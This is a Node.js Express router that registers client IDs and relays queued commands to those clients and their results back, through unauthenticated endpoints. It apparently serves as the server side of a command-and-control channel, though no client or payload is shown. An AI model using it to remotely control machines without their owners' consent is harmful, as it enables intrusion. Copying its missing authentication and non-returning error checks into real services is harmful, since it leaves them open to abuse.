const express = require("express");
const { catchAsync } = require('./utils');
const cookieParser = require('cookie-parser');
const fetch = require('node-fetch')
require('dotenv').config();
const fs = require('fs')

const router = express.Router();
router.use(cookieParser());

function readFile(path) {
    return JSON.parse(fs.readFileSync(path, 'utf8'))
}

function writeFile(path, data) {
    fs.writeFileSync(path, JSON.stringify(data))
}

router.get('/', catchAsync(async (req, res) => {
    res.sendStatus(403)
}));

router.get('/get_clients', catchAsync(async (req, res) => {
    var clients = readFile("clients.txt").clients
    res.send(JSON.stringify({ clients }))
}));

router.get('/add_client', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    var clients = readFile("clients.txt").clients
    clients.push(req.headers.client_id)
    writeFile("clients.txt", {clients})
    res.sendStatus(200)
}));

router.get('/remove_client', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    var clients = readFile("clients.txt").clients
    var new_clients = []
    clients.forEach(client => {
        if(req.headers.client_id != client) {
            console.log("ADDED")
            new_clients.push(client)
        }
    });
    writeFile("clients.txt", {clients: new_clients})
    res.sendStatus(200)
}));

router.get('/get_cmd', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    var cmds = readFile("cmds.txt")
    var cmd = cmds[req.headers.client_id]
    cmds[req.headers.client_id] = ""
    writeFile("cmds.txt", cmds)
    res.send({ cmd })
}));

router.post('/set_cmd', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    if (req.body.cmd == undefined) res.sendStatus(400)
    var cmds = readFile("cmds.txt")
    cmds[req.headers.client_id] = req.body.cmd
    writeFile("cmds.txt", cmds)
    res.sendStatus(200)
}));

router.get('/get_res', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    var client_res = readFile("res.txt")
    var res2 = client_res[req.headers.client_id]
    client_res[req.headers.client_id] = ""
    writeFile("res.txt", client_res)
    res.send({ res2 })
}));

router.post('/set_res', catchAsync(async (req, res) => {
    if (req.headers.client_id == undefined) res.sendStatus(400)
    if (req.body.res == undefined) res.sendStatus(400)
    var client_res = readFile("res.txt")
    client_res[req.headers.client_id] = req.body.res
    writeFile("res.txt", client_res)
    res.sendStatus(200)
}));


module.exports = router;